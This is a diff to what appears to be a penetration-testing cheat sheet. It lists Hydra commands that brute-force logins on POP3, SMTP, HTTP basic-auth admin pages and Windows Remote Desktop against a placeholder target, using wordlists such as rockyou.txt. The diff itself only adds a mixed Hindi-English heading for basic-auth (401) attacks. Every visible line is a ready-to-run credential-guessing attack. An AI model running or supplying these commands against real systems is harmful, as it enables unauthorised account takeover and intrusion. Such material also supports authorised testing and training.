@@ -12,7 +12,14 @@ hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V 	Hydra POP3 Bru
 
 hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V 	Hydra SMTP Brute Force
 
+
+### Basic Auth protected attack(Browser mei joh login ata hai thats 401 attack type) ### 
+
+
 hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin 	Hydra attack http get 401 login with a dictionary
+
+
+
 
 hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip 	Hydra attack Windows Remote Desktop with rockyou
 
